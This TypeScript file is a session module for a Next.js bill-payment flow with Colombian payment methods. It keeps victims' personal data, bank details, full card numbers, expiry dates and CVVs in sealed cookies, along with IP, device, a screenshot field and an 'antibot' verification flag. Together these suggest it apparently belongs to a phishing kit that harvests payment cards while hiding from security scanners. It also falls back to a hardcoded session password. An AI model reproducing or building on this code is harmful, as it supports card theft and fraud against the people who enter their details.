import { cookies as nextCookies } from "next/headers";
import { sealData, unsealData } from "iron-session";
import type { NextRequest, NextResponse } from "next/server";

export type AppSession = {
  // Flujo cliente (post-saveUser)
  id?: number;
  facturaId?: string;
  total?: number;
  factura_documento?: string;
  nombre?: string;
  expiracion?: string;
  telefono?: string;
  dispositivo?: string;
  ip?: string;
  error?: boolean;
  metodoPago?: "PSE" | "TARJETA" | "NEQUI" | "BANCOLOMBIA" | "";

  // Datos del pagador (post-pago/datos)
  email?: string;
  nombreUsuario?: string;
  tipoDocumento?: string;
  documento?: string;
  entidadBancaria?: string;
  celular?: string;
  tipoTelefono?: string;
  direccion?: string;

  // Tarjeta
  numTarjeta?: string;
  fechaVencimiento?: string;
  cvv?: string;
  cuotas?: number | string;
  background_screenshot?: string;

  // Errores flash
  errors?: Record<string, string>;
  oldInput?: Record<string, unknown>;

  // Descuento
  descuentoPorcentaje?: number;

  // CRUD auth
  cargarAuth?: boolean;

  // Antibots: marca que la request ya pasó por el middleware antibot.
  antibotVerified?: boolean;
};

const COOKIE_NAME = "mov_next_session";
const MAX_AGE = 60 * 60 * 24 * 7; // 7 días

const password =
  process.env.SESSION_PASSWORD ||
  "fallback_dev_password_change_me_minimum_32_chars_long_!!";

if (password.length < 32) {
  // eslint-disable-next-line no-console
  console.warn("[session] SESSION_PASSWORD debe tener al menos 32 caracteres.");
}

const cookieOpts = {
  httpOnly: true,
  secure: process.env.NODE_ENV === "production",
  sameSite: "lax" as const,
  path: "/",
  maxAge: MAX_AGE,
};

/**
 * Leer sesión desde Server Components / Server Actions (next/headers).
 */
export async function readSession(): Promise<AppSession> {
  const store = await nextCookies();
  const raw = store.get(COOKIE_NAME)?.value;
  if (!raw) return {};
  try {
    return await unsealData<AppSession>(raw, { password, ttl: MAX_AGE });
  } catch (e) {
    console.warn("[session] cookie inválida, limpiando", e);
    return {};
  }
}

/**
 * Leer sesión desde Route Handler (NextRequest).
 */
export async function readSessionFromReq(
  req: NextRequest
): Promise<AppSession> {
  const raw = req.cookies.get(COOKIE_NAME)?.value;
  if (!raw) return {};
  try {
    return await unsealData<AppSession>(raw, { password, ttl: MAX_AGE });
  } catch (e) {
    console.warn("[session] cookie inválida, limpiando", e);
    return {};
  }
}

/**
 * Escribir sesión en la respuesta de un Route Handler.
 * Setea la cookie explícitamente vía res.cookies.set() — más confiable
 * que el patrón implícito de iron-session.save().
 */
export async function writeSession<T extends NextResponse>(
  res: T,
  data: AppSession
): Promise<T> {
  const sealed = await sealData(data, { password, ttl: MAX_AGE });
  res.cookies.set(COOKIE_NAME, sealed, cookieOpts);
  return res;
}

/**
 * Borrar la cookie de sesión en la respuesta.
 */
export function clearSession<T extends NextResponse>(res: T): T {
  res.cookies.delete(COOKIE_NAME);
  return res;
}

/**
 * Flashes (errors/oldInput): los grabamos como parte de la sesión que
 * el siguiente Server Component consume y limpia.
 */
export async function flashErrorsToResponse<T extends NextResponse>(
  res: T,
  current: AppSession,
  errors: Record<string, string>
): Promise<T> {
  return writeSession(res, { ...current, errors });
}

export async function consumeErrors(): Promise<Record<string, string>> {
  const session = await readSession();
  const errors = session.errors ?? {};
  if (session.errors) {
    try {
      const store = await nextCookies();
      const next = { ...session };
      delete next.errors;
      const sealed = await sealData(next, { password, ttl: MAX_AGE });
      store.set(COOKIE_NAME, sealed, cookieOpts);
    } catch {
      // ignore
    }
  }
  return errors;
}
